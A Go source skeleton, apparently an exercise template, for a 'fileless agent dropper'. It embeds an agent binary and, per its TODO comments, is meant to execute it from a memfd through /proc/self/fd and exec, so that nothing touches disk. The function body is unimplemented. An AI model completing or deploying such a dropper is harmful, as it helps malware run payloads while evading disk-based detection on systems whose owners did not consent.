// SPDX-License-Identifier: MIT
//
// Fileless agent dropper.
// Embeds an agent binary at compile time and executes it from memory.
// The dropper process is replaced by the agent. No file on disk.
package main

import (
	_ "embed"
	"fmt"
	"os"
)

//go:embed agent
var agentBytes []byte

func main() {
	if err := execFromMemfd(agentBytes); err != nil {
		fmt.Fprintf(os.Stderr, "exec failed: %v\n", err)
		os.Exit(1)
	}
}

func execFromMemfd(bin []byte) error {
	// TODO 1: memfd_create WITHOUT MFD_CLOEXEC (fd must survive exec)

	// TODO 2: write agent bytes to the memfd (close the fd and return on failure)

	// TODO 3: build /proc/self/fd/<N> path

	// TODO 4: unix.Exec to replace this process with the agent

	return nil
}
